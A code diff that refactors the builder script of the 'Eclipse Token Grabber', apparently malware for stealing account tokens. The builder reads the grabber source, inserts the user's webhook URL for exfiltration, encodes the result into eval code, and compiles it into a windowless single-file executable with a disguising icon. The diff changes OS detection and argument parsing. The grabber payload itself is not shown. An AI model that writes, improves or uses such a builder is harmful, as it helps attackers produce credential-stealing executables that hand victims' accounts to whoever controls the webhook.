@@ -1,5 +1,5 @@
 from os import remove as delete_file, path
-from sys import platform
+from sys import platform as OS
 from base64 import b64encode
 from argparse import ArgumentParser
 from subprocess import run, PIPE
@@ -18,18 +18,6 @@ TITLE = '''
 ECLIPSE_GRABBER_PATH = path.join("code", "eclipse-grabber.py")
 
 
-def check_os() -> str:
-    if platform == "linux" or platform == "linux2":
-        OS = "Linux"
-    elif platform == "darwin":
-        OS = "OSX"
-    elif platform == "win32":
-        OS = "Windows"
-    else:
-        OS = "Unknown"
-    return OS
-
-
 def build(webhook: str, out_file: str):
     code_file = open(ECLIPSE_GRABBER_PATH, 'r')
     code = code_file.read()
@@ -45,24 +33,20 @@ def build(webhook: str, out_file: str):
     build_file.write(eval_code)
     build_file.close()
 
-    if check_os() == "Linux":
-        compile_command = ["wine",
-                           "/root/.wine/drive_c/"
-                           + "users/root/Local Settings/"
-                           + "Application Data/Programs/"
-                           + "Python/Python38-32/Scripts/"
-                           + "pyinstaller.exe"]
-    elif check_os() == "Windows":
+    if OS == "linux" or OS == "linux2":
+        # Linux
+        compile_command = ["wine", "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/"
+                           + "Python/Python38-32/Scripts/pyinstaller.exe"]
+    elif OS == "win32":
+        # Windows
         compile_command = ["venv/Scripts/pyinstaller.exe"]
-    elif check_os() == "OSX":
+    elif OS == "darwin":
+        # OSX
         compile_command = ["pyinstaller"]
     else:
         exit("\n[-] OS not supported\n")
 
-    compile_command += [out_file + ".py",
-                        "--onefile",
-                        "--noconsole",
-                        f"--icon={path.join('img','exe_file.ico')}"]
+    compile_command += [out_file + ".py", "--onefile", "--noconsole", f"--icon={path.join('img','exe_file.ico')}"]
 
     try:
         command_result = run(compile_command, stdout=PIPE, stderr=PIPE)
@@ -79,26 +63,20 @@ def build(webhook: str, out_file: str):
         pass
 
 
-def getArgs():
-    parser = ArgumentParser(description='Eclipse Token Grabber')
-    parser.add_argument('-w', '--webhook',
-                        help='add your webhook url',
-                        default='',
-                        required=True)
-    parser.add_argument('-o', '--outfile',
-                        help='name your executable',
-                        default='',
-                        required=True)
+def get_args():
+    parser = ArgumentParser(description='Eclipse Token Grabber Builder')
+    parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
+    parser.add_argument('-o', '--outfile', help='name your executable', default='', required=True)
     return parser.parse_args()
 
 
 def main(args):
     print(TITLE)
-    print("\n[+] Generating Eclipse Token Grabber, please wait...")
+    print("\n[+] Building Eclipse Token Grabber, please wait...")
     build(args.webhook, args.outfile)
     print("\n\n[+] Succesfully Builded Eclipse Token Grabber",
           "\n\n[+] You can find it inside the dist directory")
 
 
 if __name__ == "__main__":
-    main(getArgs())
+    main(get_args())
